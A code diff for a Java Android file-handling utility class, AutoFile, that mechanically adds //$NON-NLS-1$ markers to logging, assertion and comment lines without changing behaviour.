@@ -29,7 +29,7 @@ import com.android.service.util.Utils;
 public final class AutoFile {
 
 	/** The Constant TAG. */
-	private static final String TAG = "AutoFile";
+	private static final String TAG = "AutoFile"; //$NON-NLS-1$
 	/** The file. */
 	File file;
 
@@ -77,7 +77,7 @@ public final class AutoFile {
 			return buffer;
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 
 		} finally {
@@ -86,7 +86,7 @@ public final class AutoFile {
 					in.close();
 				} catch (final IOException e) {
 					if (Cfg.DEBUG) {
-						Check.log(e);
+						Check.log(e) ;//$NON-NLS-1$
 					}
 				}
 			}
@@ -132,7 +132,7 @@ public final class AutoFile {
 					out.close();
 				} catch (final IOException e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: " + e.toString());
+						Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 					}
 				}
 			}
@@ -172,7 +172,7 @@ public final class AutoFile {
 	}
 
 	/**
-	 * Checks if the file is a directory.
+	 * Check. if the file is a directory. //$NON-NLS-1$
 	 * 
 	 * @return true, if is directory
 	 */
@@ -187,7 +187,7 @@ public final class AutoFile {
 	 */
 	public String[] list() {
 		if (Cfg.DEBUG) {
-			Check.asserts(isDirectory(), "Should be a directory");
+			Check.asserts(isDirectory(), "Should be a directory"); //$NON-NLS-1$
 		}
 		return file.list();
 	}
@@ -236,7 +236,7 @@ public final class AutoFile {
 	public void create() {
 		write(new byte[0]);
 		if (Cfg.DEBUG) {
-			Check.ensures(file.exists(), "Non existing files");
+			Check.ensures(file.exists(), "Non existing files"); //$NON-NLS-1$
 		}
 	}
 
@@ -258,12 +258,12 @@ public final class AutoFile {
 			file.renameTo(newfile);
 
 			if (Cfg.DEBUG) {
-				Check.asserts(newfile.exists(), "rename");
+				Check.asserts(newfile.exists(), "rename"); //$NON-NLS-1$
 			}
 
 		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(ex);
+				Check.log(ex) ;//$NON-NLS-1$
 			}
 			return false;
 		}
